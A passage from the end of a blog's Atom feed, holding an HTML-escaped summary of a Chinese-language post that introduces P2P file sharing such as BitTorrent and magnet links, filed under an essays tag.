height:300px;}</style>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;1-引言&quot;&gt;&lt;a href=&quot;#1-引言&quot; class=&quot;headerlink&quot; title=&quot;1. 引言&quot;&gt;&lt;/a&gt;1. 引言&lt;/h2&gt;&lt;p&gt;相信没有人没使用过 P2P 技术. BT 种子和磁力链接就是最常见的 P2P 技术, 使用 P2P 技术, 文件不再需要
      
    
    </summary>
    
    
      <category term="随笔" scheme="http://ya2.top/tags/%E9%9A%8F%E7%AC%94/"/>
    
  </entry>
  
</feed>
